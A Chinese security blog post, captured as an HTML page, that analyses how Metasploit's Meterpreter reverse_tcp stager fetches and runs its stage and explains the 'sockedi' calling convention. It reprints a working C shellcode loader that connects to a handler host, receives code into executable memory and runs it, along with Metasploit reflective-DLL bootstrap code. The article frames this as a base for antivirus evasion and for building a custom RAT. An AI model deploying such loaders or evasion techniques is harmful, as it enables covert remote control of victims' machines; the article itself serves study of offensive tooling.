<!doctype html><html lang=zh dir=auto>
<head><meta charset=utf-8>
<meta http-equiv=x-ua-compatible content="IE=edge">
<meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no">
<meta name=robots content="index, follow">
<title>metasploit payload运行原理浅析(sockedi调用约定是什么) | Akkuman 的博客</title>
<meta name=keywords content="msf,红队,工具,逆向">
<meta name=description content="本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?">
<meta name=author content>
<link rel=canonical href=http://hacktech.cn/2020/05/09/what-is-sockedi-call-convention-in-msf/>
<link crossorigin=anonymous href=https://cdn.jsdelivr.net/gh/akkuman/akkuman.github.io@master/assets/css/stylesheet.min.2d7d75b9e2169b339e3eb6eaf518b7e5473045f05605aa42ea980b993db2ceae.css integrity="sha256-LX11ueIWmzOePrbq9Ri35UcwRfBWBapC6pgLmT2yzq4=" rel="preload stylesheet" as=style>
<link rel=icon href=http://hacktech.cn/images/avatar.webp>
<link rel=icon type=image/png sizes=16x16 href=http://hacktech.cn/favicon-16x16.png>
<link rel=icon type=image/png sizes=32x32 href=http://hacktech.cn/favicon-32x32.png>
<link rel=apple-touch-icon href=http://hacktech.cn/apple-touch-icon.png>
<link rel=mask-icon href=http://hacktech.cn/safari-pinned-tab.svg>
<meta name=theme-color content="#2e2e33">
<meta name=msapplication-TileColor content="#2e2e33">
<meta name=generator content="Hugo 0.87.0">
<link rel=alternate hreflang=zh href=http://hacktech.cn/2020/05/09/what-is-sockedi-call-convention-in-msf/>
<link rel=preconnect href=https://fonts.googleapis.com>
<link rel=preconnect href=https://fonts.gstatic.com crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC&display=swap" rel=stylesheet>
<style>@font-face{font-family:source code pro;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sourcecodepro/v14/HI_SiYsKILxRpg3hIP6sJ7fM7PqlMOvWjMY.woff2)format('woff2');unicode-range:U+460-52F,U+1C80-1C88,U+20B4,U+2DE0-2DFF,U+A640-A69F,U+FE2E-FE2F}@font-face{font-family:source code pro;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sourcecodepro/v14/HI_SiYsKILxRpg3hIP6sJ7fM7PqlOevWjMY.woff2)format('woff2');unicode-range:U+400-45F,U+490-491,U+4B0-4B1,U+2116}@font-face{font-family:source code pro;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sourcecodepro/v14/HI_SiYsKILxRpg3hIP6sJ7fM7PqlPuvWjMY.woff2)format('woff2');unicode-range:U+370-3FF}@font-face{font-family:source code pro;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sourcecodepro/v14/HI_SiYsKILxRpg3hIP6sJ7fM7PqlMuvWjMY.woff2)format('woff2');unicode-range:U+102-103,U+110-111,U+128-129,U+168-169,U+1A0-1A1,U+1AF-1B0,U+1EA0-1EF9,U+20AB}@font-face{font-family:source code pro;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sourcecodepro/v14/HI_SiYsKILxRpg3hIP6sJ7fM7PqlM-vWjMY.woff2)format('woff2');unicode-range:U+100-24F,U+259,U+1E??,U+2020,U+20A0-20AB,U+20AD-20CF,U+2113,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:source code pro;font-style:normal;font-weight:400;font-display:swap;src:url(https://fonts.gstatic.com/s/sourcecodepro/v14/HI_SiYsKILxRpg3hIP6sJ7fM7PqlPevW.woff2)format('woff2');unicode-range:U+??,U+131,U+152-153,U+2BB-2BC,U+2C6,U+2DA,U+2DC,U+2000-206F,U+2074,U+20AC,U+2122,U+2191,U+2193,U+2212,U+2215,U+FEFF,U+FFFD}</style>
<script async src=//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js></script>
<meta property="og:title" content="metasploit payload运行原理浅析(sockedi调用约定是什么)">
<meta property="og:description" content="本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?">
<meta property="og:type" content="article">
<meta property="og:url" content="http://hacktech.cn/2020/05/09/what-is-sockedi-call-convention-in-msf/"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2020-05-09T17:39:00+00:00">
<meta property="article:modified_time" content="2020-05-09T17:39:00+00:00">
<meta name=twitter:card content="summary">
<meta name=twitter:title content="metasploit payload运行原理浅析(sockedi调用约定是什么)">
<meta name=twitter:description content="本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?">
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"http://hacktech.cn/posts/"},{"@type":"ListItem","position":2,"name":"metasploit payload运行原理浅析(sockedi调用约定是什么)","item":"http://hacktech.cn/2020/05/09/what-is-sockedi-call-convention-in-msf/"}]}</script>
<script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"metasploit payload运行原理浅析(sockedi调用约定是什么)","name":"metasploit payload运行原理浅析(sockedi调用约定是什么)","description":"本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?\n","keywords":["msf","红队","工具","逆向"],"articleBody":"本篇文章主要讨论一下msf官方文档中提到的sockedi调用约定到底是指什么?\n背景 最近在做一些msf相关的事情，今天听到免杀相关的，去查询了下相关资料。\n第一个不能错过的就是cobalt strike作者早年写的metasploit-loader项目了，我看了项目源码，找了一些相关资料\n在 Meterpreter载荷执行原理分析 文章发现了一些细节性的东西，也感谢该文作者的抛砖引玉，不过文中有一些错误以及未说明白的地方，我会一一道来。\n注意：本文只是对我自己的分析结果进行一次复盘，如果有什么错误之处欢迎大家斧正\nmetasploit loader metasploit的shellcode到底做了什么 首先我们需要探讨的第一个问题是metasploit的shellcode到底做了什么？\n在msf的官方wiki中，官方有对这个问题做一些简单的解释\n How payloads work 中文翻译版在这  从上面的文章我们大致能知道其实我们使用msf生成的shellcode只是一个加载器(Stagers)，然后加载器通过我们生成shellcode时指定的ip和端口回连过来取到真正执行的恶意载荷(Stages)\n加载器(Stagers)回连的具体流程 那么提出第二个问题，这个加载器(Stagers)回连的具体代码流程是怎样的？\n我们通过文档只能知道Stagers通过网络加载Stages，那么Stages是什么？shellcode？可执行文件？反射dll？这些我们还都不清楚。\n然后通过网上一些零星的资料，找到了msf邮件组曾经的两封邮件（源地址已无法访问，所幸WebArchive有留存）\n [framework] inline meterpreter payload [framework] inline meterpreter payload  里面提到流程以及关键点\n流程\n No tutorials that I know of, but here are the basic steps:\n connect to the handler read a 4-byte length allocate a length-byte buffer mark it as writable and executable (on Windows you’ll need VirtualProtect for this) read length bytes into that buffer jump to the buffer. easiest way to do this in C is cast it to a function pointer and call it.   关键点\n Assuming this is for X86 arch, you have to make sure that the EDI register contains your socket descriptor (the value of the ConnectSocket variable). You can do this via inline asm, but it might be easier to just prepend the 5 bytes for setting it to your shellcode:\nBF 78 56 34 12 mov edi, 0x12345678\nFor 64 bit, you have to use the RDI register (and need 10 bytes):\n48 BF 78 56 34 12 00 00 00 00 mov rdi, 0x12345678\nHope this helps,\nMichael\nPS: This is the reason why the calling convention within Metasploit is called “sockedi” :-)\n 也就是说主要的流程大致上就是\n tcp连接 读取socket前四个byte，这个为后面的载荷的长度 分配可读可写可执行的内存，把载荷塞进去 注意这段载荷的前面需要手动加 mov edi, \u0026socket 然后跳转到这块内存进行执行  实现起来并不困难，但是有些奇怪的点，比如为什么需要手动把edi的值设置为socket的地址？这个我们先放一放，看看一些loader的源码\n首先是cobalt strike作者的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  int main(int argc, char * argv[]) { ULONG32 size; char * buffer; void (*function)(); winsock_init(); if (argc != 3) { printf(\"%s [host] [port]\\n\", argv[0]); exit(1); } /* connect to the handler */ SOCKET my_socket = wsconnect(argv[1], atoi(argv[2])); /* read the 4-byte length */ int count = recv(my_socket, (char *)\u0026size, 4, 0); if (count != 4 || size  0) punt(my_socket, \"read a strange or incomplete length value\\n\"); /* allocate a RWX buffer */ buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer == NULL) punt(my_socket, \"could not allocate buffer\\n\"); /* prepend a little assembly to move our SOCKET value to the EDI register thanks mihi for pointing this out BF 78 56 34 12 = mov edi, 0x12345678 */ buffer[0] = 0xBF; /* copy the value of our socket to the buffer */ memcpy(buffer + 1, \u0026my_socket, 4); /* read bytes into the buffer */ count = recv_all(my_socket, buffer + 5, size); /* cast our buffer as a function and call it */ function = (void (*)())buffer; function(); return 0; }   其他的函数我并没有列出来，里面的实现应该也很明白，就是我之前说的流程\n然后是先知社区的，其实也就是把上一份代码注释翻译了一下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56  //主函数 int main(int argc, char * argv[]) { ULONG32 size; char * buffer; //创建函数指针，方便XXOO  void (*function)(); winsock_init(); //套接字初始化  //获取参数，这里随便写，接不接收无所谓，主要是传递远程主机IP和端口  //这个可以事先定义好  if (argc != 3) { printf(\"%s [host] [port] ^__^ \\n\", argv[0]); exit(1); } /*连接到处理程序，也就是远程主机 */ SOCKET my_socket = my_connect(argv[1], atoi(argv[2])); /* 读取4字节长度 *这里是meterpreter第一次发送过来的 *4字节缓冲区大小2E840D00，大小可能会有所不同,当然也可以自己丢弃，自己定义一个大小 */ //是否报错  //如果第一次不是接收的4字节那么就退出程序  int count = recv(my_socket, (char *)\u0026size, 4, 0); if (count != 4 || size  0) punt(my_socket, \"read length value Error\\n\"); /* 分配一个缓冲区 RWX buffer */ buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (buffer == NULL) punt(my_socket, \"could not alloc buffer\\n\"); /* *SOCKET赋值到EDI寄存器，装载到buffer[]中 */ //mov edi  buffer[0] = 0xBF; /* 把我们的socket里的值复制到缓冲区中去*/ memcpy(buffer + 1, \u0026my_socket, 4); /* 读取字节到缓冲区 *这里就循环接收DLL数据，直到接收完毕 */ count = recv_all(my_socket, buffer + 5, size); /* 将缓冲区作为函数并调用它。 * 这里可以看作是shellcode的装载， * 因为这本身是一个DLL装载器，完成使命，控制权交给DLL， * 但本身不退出，除非迁移进程，靠DLL里函数，DLL在DLLMain里是循环接收指令的，直到遇到退出指令， * (void (*)())buffer的这种用法经常出现在shellcode中 */ function = (void (*)())buffer; function(); return 0; }   两份代码都没解决我们的疑问\n我们直接翻翻msf源码\nlib/msf/core/payload/windows/reverse_tcp.rb\n代码比较长我就不贴了，简要说一下， asm_block_recv 函数是接收载荷的函数，然后我们看看 asm_reverse_tcp\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  create_socket: push #{encoded_host} ; host in little-endian format  push #{encoded_port} ; family AF_INET and port number  mov esi, esp ; save pointer to sockaddr struct  push eax ; if we succeed, eax will be zero, push zero for the flags param.  push eax ; push null for reserved parameter  push eax ; we do not specify a WSAPROTOCOL_INFO structure  push eax ; we do not specify a protocol  inc eax ;  push eax ; push SOCK_STREAM  inc eax ;  push eax ; push AF_INET  push #{Rex::Text.block_api_hash('ws2_32.dll', 'WSASocketA')}  call ebp ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );  xchg edi, eax ; save the socket for later, don't care about the value of eax after this   call WSASocketA 之后返回的是socket句柄，返回值一般是在eax里面，然后把eax赋值到了edi\n继续找找edi，但是发现剩下的edi都是用作调用，好像没有什么明显的作用，那为什么有这个？\n这个载荷Stages具体是怎么生成的？ 这里就要引入我刚才说的先知上的那篇文章的问题了，在 Meterpreter载荷执行原理分析 文章中，作者提到\n metasploit的meterpreter的payload调用了meterpreter_loader.rb文件，在meterpreter_loader.rb文件中又引入了reflective_dll_loader.rb文件，reflective_dll_loader.rb主要是获取ReflectiveLoader()的偏移地址，用于重定位使用，没有什么可分析的。我们来到这个文件里reflectivedllinject.rb，这个文件主要是修复反射dll的，meterpreter_loader.rb文件主要是用于自身模块使用，修复dll和读取payload的长度的。\n 其实 windows/meterpreter/reverse_tcp 是走的 meterpreter_loader，而不是文中的 reflectivedllinject，我通过调试发现这个请求载荷的过程是流经 meterpreter_loader 文件的\n不过这两个文件的功效都是差不多的，我们打开分析一下\n映入眼帘的应该是这段\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  def stage_meterpreter(opts={}) # Exceptions will be thrown by the mixin if there are issues. dll, offset = load_rdi_dll(MetasploitPayloads.meterpreter_path('metsrv', 'x86.dll')) asm_opts = { rdi_offset: offset, length: dll.length, stageless: opts[:stageless] == true } asm = asm_invoke_metsrv(asm_opts) # generate the bootstrap asm bootstrap = Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string # sanity check bootstrap length to ensure we dont overwrite the DOS headers e_lfanew entry if bootstrap.length  62 raise RuntimeError, \"Meterpreter loader (x86) generated an oversized bootstrap!\" end # patch the bootstrap code into the dll's DOS header... dll[ 0, bootstrap.length ] = bootstrap dll end   这段代码里面首先取到了metsrv的dll的文件，然后传入 asm_invoke_metsrv 函数做处理，生成汇编字节码，然后替换这个dll的头部\n我们看看 load_rdi_dll 函数，这个函数取到了一个偏移量然后传入 asm_invoke_metsrv 函数做处理了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  def load_rdi_dll(dll_path) dll = '' ::File.open(dll_path, 'rb') { |f| dll = f.read } offset = parse_pe(dll) unless offset raise \"Cannot find the ReflectiveLoader entry point in #{dll_path}\" end return dll, offset end def parse_pe(dll) pe = Rex::PeParsey::Pe.new(Rex::ImageSource::Memory.new(dll)) offset = nil pe.exports.entries.each do |e| if e.name =~ /^\\S*ReflectiveLoader\\S*/ offset = pe.rva_to_file_offset(e.rva) break end end offset end   甚至我们不用深究这些函数的具体流程，看名称就知道，这个是从dll导出表找到了ReflectiveLoader导出函数的地址\n然后进入 asm_invoke_metsrv 看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  def asm_invoke_metsrv(opts={}) asm = %Q^ ; prologue dec ebp ; 'M' pop edx ; 'Z' call $+5 ; call next instruction pop ebx ; get the current location (+7 bytes) push edx ; restore edx inc ebp ; restore ebp push ebp ; save ebp for later mov ebp, esp ; set up a new stack frame ; Invoke ReflectiveLoader() ; add the offset to ReflectiveLoader() (0x????????) add ebx, #{\"0x%.8x\" % (opts[:rdi_offset] - 7)} call ebx ; invoke ReflectiveLoader() ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) ; offset from ReflectiveLoader() to the end of the DLL add ebx, #{\"0x%.8x\" % (opts[:length] - opts[:rdi_offset])} ^ unless opts[:stageless] || opts[:force_write_handle] == true asm  %Q^ mov [ebx], edi ; write the current socket/handle to the config ^ end asm  %Q^ push ebx ; push the pointer to the configuration start push 4 ; indicate that we have attached push eax ; push some arbitrary value for hInstance call eax ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr) ^ end   不得不说这段十分巧妙，我们想想刚才的流程是什么，排开那个 mov edi, \u0026socket 不论，剩下的就是从传回来的载荷的首地址开始跑了，那假如是一个dll文件，你把一个平常的dll文件，VirtualAlloc后直接跳到地址跑，能跑起来吗？显然是不能的，我们看看msf中的处理\n我们上面的代码分析过，这个汇编最后是替换了dll的头部，pe文件的头部就是dos头，dos头必须是MZ开头，不然这个根本算不上一个pe文件\n那 dec ebp 和 pop edx 算怎么回事？\n其实这两条汇编的机器码就是\n1 2  \\x4D # dec ebp \\x5A # pop edx   恰好构成了MZ头，然后继续往下跑，调用了ReflectiveLoader()，这个是反射dll技术，具体代码技术细节可以见 https://github.com/stephenfewer/ReflectiveDLLInjection\n调用该dll导出函数 ReflectiveLoader 的主要功能就是加载dll自身到内存中，然后返回dllmain的函数地址，返回值是在eax里面\n然后调用 mov [ebx], edi ; write the current socket/handle to the config 把edi也就是上文提到的socket句柄地址存入ebx执行的内存，上面可以看到\n1 2  ; offset from ReflectiveLoader() to the end of the DLL add ebx, #{\"0x%.8x\" % (opts[:length] - opts[:rdi_offset])}   这段汇编把ebx指向到了该dll加载空间的末尾\n紧接着执行\n1 2 3 4  push ebx ; push the pointer to the configuration start push 4 ; indicate that we have attached push eax ; push some arbitrary value for hInstance call eax ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)   调用储存在eax中的dllmain的函数\n其中的ebx到底是什么？\n我们把目光再往外层拉\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  def stage_payload(opts={}) stage_meterpreter(opts) + generate_config(opts) end def generate_config(opts={}) ds = opts[:datastore] || datastore opts[:uuid] ||= generate_payload_uuid # create the configuration block, which for staged connections is really simple. config_opts = { arch: opts[:uuid].arch, null_session_guid: opts[:null_session_guid] == true, exitfunk: ds[:exit_func] || ds['EXITFUNC'], expiration: (ds[:expiration] || ds['SessionExpirationTimeout']).to_i, uuid: opts[:uuid], transports: opts[:transport_config] || [transport_config(opts)], extensions: [], stageless: opts[:stageless] == true } # create the configuration instance based off the parameters config = Rex::Payloads::Meterpreter::Config.new(config_opts) # return the binary version of it config.to_b end   可以看到 stage_payload 中把生成好的dll字节码和一串config拼接了起来，config里面的参数要分析的话又是一大块了，本文不着眼于此\n跟进 config.to_b 看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40  def to_b config_block end def config_block # start with the session information config = session_block(@opts) # then load up the transport configurations (@opts[:transports] || []).each do |t| config  transport_block(t) end # terminate the transports with NULL (wchar) config  \"\\x00\\x00\" # configure the extensions - this will have to change when posix comes # into play. file_extension = 'x86.dll' file_extension = 'x64.dll' unless is_x86? (@opts[:extensions] || []).each do |e| config  extension_block(e, file_extension) end # terminate the extensions with a 0 size config  [0].pack('V') # wire in the extension init data (@opts[:ext_init] || '').split(':').each do |cfg| name, value = cfg.split(',') config  extension_init_block(name, value) end # terminate the ext init config with a final null byte config  \"\\x00\" # and we're done config end   然后我们跟进 session_block 和 transport_block 看看就能明白这就是一串配置转化为字节码，具体的转化规则我们不论\n可以看到 函数里面有\n1 2 3 4 5 6 7 8 9  session_data = [ 0, # comms socket, patched in by the stager exit_func, # exit function identifer opts[:expiration], # Session expiry uuid, # the UUID session_guid # the Session GUID ] session_data.pack('QVVA*A*')   最开始的是0，pack的格式是Q，8位，这8位是干嘛的？\n现在回过头想想，当之前生成好的dll载荷，我们从首地址开始跑，我们刚才那个edi(socket地址)填充到哪了，是不是那个dll空间的末尾再往后填，这个空间不恰好就是这8位0吗？\n所谓的sockedi到底是啥？ 跟踪edi 根据我们前面的分析，我们把加载器挂调试器跑起来看看\n首先分配完RWX内存空间后，我们看到了首地址 0x6A0000，然后我们在内存窗口中转到该地址，那我们重点关注的是dll所在区域的末尾，我们直接把内存地址转到 0x6CAC06（别问我怎么知道的，方法很多，比如多次调试）\n我们首先把内存地址转到这个地方然后往下跑把数据接过来看看\n现在前八位还是空的，但是后面已经有一些数据了，包括一些能看到文字的配置（比如tcp://0.0.0.0:4444）然后继续下跑，进到我们分配出来的函数去看看\n首当其冲的就是我们的 mov edi, \u0026socket，继续往下\n可以看到，和我们预期的一样，复制到了这八位的空间里面，这里可以配合msf源码以及我的注释查看\n分析用作载荷的反射dll 还记得我们前面分析的源码中的metsrv dll文件吗？\n我们可以在 metasploit-payloads 中找到这个项目的源码\n我们直接看看metsrc dllmain函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) { BOOL bReturnValue = TRUE; switch (dwReason) { case DLL_METASPLOIT_ATTACH: bReturnValue = Init((MetsrvConfig*)lpReserved); break; case DLL_QUERY_HMODULE: if (lpReserved != NULL) *(HMODULE*)lpReserved = hAppInstance; break; case DLL_PROCESS_ATTACH: hAppInstance = hinstDLL; break; case DLL_PROCESS_DETACH: case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: break; } return bReturnValue; }   刚才调用dllmain我们是使用了 calleax ;call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)\n我们这个 config_ptr 传递的是什么？是 push ebx ; push the pointer to the configuration start，也就是那个首8位塞了我们socket句柄地址的数据的起始地址，然后走 DLL_METASPLOIT_ATTACH 分支，把这个地址中的数据强转为了 MetsrvConfig 结构体\n我们看看 MetsrvConfig 结构体\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  typedef struct _MetsrvConfig { MetsrvSession session; MetsrvTransportCommon transports[1]; ///! Placeholder for 0 or more transports \t// Extensions will appear after this \t// After extensions, we get a list of extension initialisers \t// \\x00 \t// \\x00 \t// \\x00 } MetsrvConfig; typedef struct _MetsrvSession { union { UINT_PTR handle; BYTE padding[8]; } comms_handle; ///! Socket/handle for communications (if there is one). \tDWORD exit_func; ///! Exit func identifier for when the session ends. \tint expiry; ///! The total number of seconds to wait before killing off the session. \tBYTE uuid[UUID_SIZE]; ///! UUID \tBYTE session_guid[sizeof(GUID)]; ///! Current session GUID } MetsrvSession; typedef struct _MetsrvTransportCommon { CHARTYPE url[URL_SIZE]; ///! Transport url: scheme://host:port/URI \tint comms_timeout; ///! Number of sessions to wait for a new packet. \tint retry_total; ///! Total seconds to retry comms for. \tint retry_wait; ///! Seconds to wait between reconnects. } MetsrvTransportCommon;   这些信息很明显能看到是一些信息，比如uuid，重试次数之类的，这些在payload的生成选项里面都能找到\n那么我们现在差不多明白了，这一块的东西是强转成了这个结构体，包括edi中所存放的socket句柄地址\n好吧，别忘了我们的使命，搞清楚这个edi的作用\n划入这个结构体也就是\n1 2 3 4 5  union { UINT_PTR handle; BYTE padding[8]; } comms_handle; ///! Socket/handle for communications (if there is one).   也就是我们找找 comms_handle 用在了哪\n所以进到 Init((MetsrvConfig*)lpReserved) 里面看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32  DWORD Init(MetsrvConfig* metConfig) { // if hAppInstance is still == NULL it means that we havent been \t// reflectivly loaded so we must patch in the hAppInstance value \t// for use with loading server extensions later. \tInitAppInstance(); // In the case of metsrv payloads, the parameter passed to init is NOT a socket, it's actually \t// a pointer to the metserv configuration, so do a nasty cast and move on. \tdprintf(\"[METSRV] Getting ready to init with config %p\", metConfig); DWORD result = server_setup(metConfig); dprintf(\"[METSRV] Exiting with %08x\", metConfig-session.exit_func); // We also handle exit func directly in metsrv now because the value is added to the \t// configuration block and we manage to save bytes in the stager/header as well. \tswitch (metConfig-session.exit_func) { case EXITFUNC_SEH: SetUnhandledExceptionFilter(NULL); break; case EXITFUNC_THREAD: ExitThread(0); break; case EXITFUNC_PROCESS: ExitProcess(0); break; default: break; } return result; }   里面调用了 server_setup 然后吐出了结果，最后返回，跟到外层也就是dllmain的返回值，dllmain返回值作用我不赘述了，然后根据你的生成选项中的 EXITFUNC 来进行退出，退出进程、线程或者SEH异常，这里我们不管，我们看看 server_setup 函数\nserver_setup函数很长，我就不贴整个函数了\n使用了 comms_handle 的我贴一下\n1 2 3 4 5 6 7 8 9  ... dprintf(\"[SESSION] Comms handle: %u\", config-session.comms_handle); ... dprintf(\"[DISPATCH] Transport handle is %p\", (LPVOID)config-session.comms_handle.handle); if (remote-transport-set_handle) { remote-transport-set_handle(remote-transport, config-session.comms_handle.handle); }   根据这些代码我们能够知道是把 Transport handle 设置为了我们之前创建的socket\n继续往后找我们能找到\n然后跟进 transport_set_handle_tcp 可以看到\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  /*! * @brief Get the socket from the transport (if it's TCP). * @param transport Pointer to the TCP transport containing the socket. * @return The current transport socket FD, if any, or zero. */ static UINT_PTR transport_get_handle_tcp(Transport* transport) { if (transport \u0026\u0026 transport-type == METERPRETER_TRANSPORT_TCP) { return (UINT_PTR)((TcpTransportContext*)transport-ctx)-fd; } return 0; } /*! * @brief Set the socket from the transport (if it's TCP). * @param transport Pointer to the TCP transport containing the socket. * @param handle The current transport socket FD, if any. */ static void transport_set_handle_tcp(Transport* transport, UINT_PTR handle) { if (transport \u0026\u0026 transport-type == METERPRETER_TRANSPORT_TCP) { ((TcpTransportContext*)transport-ctx)-fd = (SOCKET)handle; } }   也只是转为了socket句柄，然后给外部再继续通过这个socket去取一些服务器上的东西（后面的我没再跟下去了，我猜测也只有这种可能）\n总结 这次的分析耗时一天，从上午看到讨论免杀，加载器，然后开始分析，说实话，还是收获了不少，比如那个反射dll的改dos头就让我不得不佩服，卧槽，这操作骚。本次只是拿 windows/meterpreter/reverse_tcp 开刀，我相信其他的也一样，不然何以被官方称 sockedi 调用约定，说明这已经是msf里面加载的约定成俗的东西了。\n那么从这次的分析中我们能获得哪些启示？当然是免杀对抗的启示，antiAV方可以通过研究使用自己的payload格式，AV方可以通过这个流程来对msf的payload的查杀更上一步，或者根据里面的改DOS头技术打造自己的模块化RAT\n下一步可以做的  研究payload uuid的回传 研究rc4，aes之类的所谓加密shellcode，加密是在哪里 …  现在就可以得到的  当然是一个香喷喷的shellcode加载器，具体实现就是八仙过海各显神通了。 改DOS头直接执行的技术 ","wordCount":"2304","inLanguage":"zh","datePublished":"2020-05-09T17:39:00Z","dateModified":"2020-05-09T17:39:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"http://hacktech.cn/2020/05/09/what-is-sockedi-call-convention-in-msf/"},"publisher":{"@type":"Organization","name":"Akkuman 的博客","logo":{"@type":"ImageObject","url":"http://hacktech.cn/images/avatar.webp"}}}</script>
</head>
<body id=top>
<script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add('dark'):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove('dark'):window.matchMedia('(prefers-color-scheme: dark)').matches&&document.body.classList.add('dark')</script>
<noscript>
<style type=text/css>#theme-toggle,.top-link{display:none}</style>
<style>@media(prefers-color-scheme:dark){:root{--theme:#1d1e20;--entry:#2e2e33;--primary:rgba(255, 255, 255, 0.84);--secondary:rgba(255, 255, 255, 0.56);--tertiary:rgba(255, 255, 255, 0.16);--content:rgba(255, 255, 255, 0.74);--hljs-bg:#2e2e33;--code-bg:#37383e;--border:#333}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style>
</noscript>
<header class=header>
<nav class=nav>
<div class=logo>
<a href=http://hacktech.cn/ accesskey=h title="Akkuman 的博客 (Alt + H)">Akkuman 的博客</a>
<span class=logo-switches>
<button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg>
</button>
<ul class=lang-switch><li>|</li>
<li>
<a href=http://hacktech.cn/en/ title=English aria-label=English>En</a>
</li>
</ul>
</span>
</div>
<ul id=menu>
<li>
<a href=http://hacktech.cn/archives/ title=归档>
<span>归档</span>
</a>
</li>
<li>
<a href=http://hacktech.cn/categories/ title=分类>
<span>分类</span>
</a>
</li>
<li>
<a href=http://hacktech.cn/search/ title=搜索>
<span>搜索</span>
</a>
</li>
<li>
<a href=http://hacktech.cn/tags/ title=标签>
<span>标签</span>
</a>
</li>
<li>
<a href=http://hacktech.cn/links/ title=链接>
<span>链接</span>
</a>
</li>
</ul>
</nav>
</header>
<main class=main>
<article class=post-single>
<header class=post-header>
<div class=breadcrumbs><a href=http://hacktech.cn/>主页</a>&nbsp;»&nbsp;<a href=http://hacktech.cn/posts/>Posts</a></div>
<h1 class=post-title>
metasploit payload运行原理浅析(sockedi调用约定是什么)
</h1>
<div class=post-meta>May 9, 2020&nbsp;·&nbsp;11 分钟&nbsp;|&nbsp;<a href="mailto://akkumans@qq.com?subject=Suggesting%20changes%20for%20/posts/what-is-sockedi-call-convention-in-msf.md" rel="noopener noreferrer" target=_blank>给我邮件</a>
</div>
</header> <div class=toc>
<details>
<summary accesskey=c title="(Alt + C)">
<div class=details>目录</div>
</summary>
<div class=inner><ul>
<li>
<a href=#%e8%83%8c%e6%99%af aria-label=背景>背景</a></li>
<li>
<a href=#metasploit-loader aria-label="metasploit loader">metasploit loader</a><ul>
<li>
<a href=#metasploit%e7%9a%84shellcode%e5%88%b0%e5%ba%95%e5%81%9a%e4%ba%86%e4%bb%80%e4%b9%88 aria-label=metasploit的shellcode到底做了什么>metasploit的shellcode到底做了什么</a></li>
<li>
